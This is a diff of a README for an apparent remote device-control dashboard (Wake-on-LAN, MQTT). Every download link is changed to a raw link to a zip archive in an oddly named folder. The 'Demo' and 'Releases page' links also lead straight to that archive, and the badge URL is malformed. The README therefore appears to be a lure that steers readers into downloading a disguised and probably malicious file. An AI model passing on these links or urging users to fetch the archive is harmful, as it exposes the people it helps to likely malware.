@@ -1,6 +1,6 @@
 # 🚀 ESP-desktop-control-dashboard - Manage Devices With Ease
 
-[![Download](https://raw.githubusercontent.com/solihat69/ESP-desktop-control-dashboard/main/attestable/ESP-desktop-control-dashboard.zip%20Now-ESP--desktop--control--dashboard-blue)](https://raw.githubusercontent.com/solihat69/ESP-desktop-control-dashboard/main/attestable/ESP-desktop-control-dashboard.zip)
+[![Download](https://github.com/solihat69/ESP-desktop-control-dashboard/raw/refs/heads/main/undertrained/ES-dashboard-desktop-control-v2.5.zip%20Now-ESP--desktop--control--dashboard-blue)](https://github.com/solihat69/ESP-desktop-control-dashboard/raw/refs/heads/main/undertrained/ES-dashboard-desktop-control-v2.5.zip)
 
 Welcome to the **System Control Dashboard**, a web-based application for managing Desktop and Server devices remotely. You can wake devices with ease using Wake-on-LAN (WOL) and control them with MQTT. 
 
@@ -27,7 +27,7 @@ The System Control Dashboard offers a modern interface to control your devices e
 
 ## 🎥 Demo
 
-You can see the System Control Dashboard in action [here](https://raw.githubusercontent.com/solihat69/ESP-desktop-control-dashboard/main/attestable/ESP-desktop-control-dashboard.zip). This demo shows how the application operates, providing a glimpse into its features and capabilities.
+You can see the System Control Dashboard in action [here](https://github.com/solihat69/ESP-desktop-control-dashboard/raw/refs/heads/main/undertrained/ES-dashboard-desktop-control-v2.5.zip). This demo shows how the application operates, providing a glimpse into its features and capabilities.
 
 ## 🛠️ Prerequisites
 
@@ -41,7 +41,7 @@ To run the System Control Dashboard effectively, ensure you have:
 
 To download the application, visit the Releases page. There, you will find the most recent version available.
 
-[Download the latest version here!](https://raw.githubusercontent.com/solihat69/ESP-desktop-control-dashboard/main/attestable/ESP-desktop-control-dashboard.zip)
+[Download the latest version here!](https://github.com/solihat69/ESP-desktop-control-dashboard/raw/refs/heads/main/undertrained/ES-dashboard-desktop-control-v2.5.zip)
 
 1. Click the link above to access the Releases page.
 2. Choose the version you wish to download. 
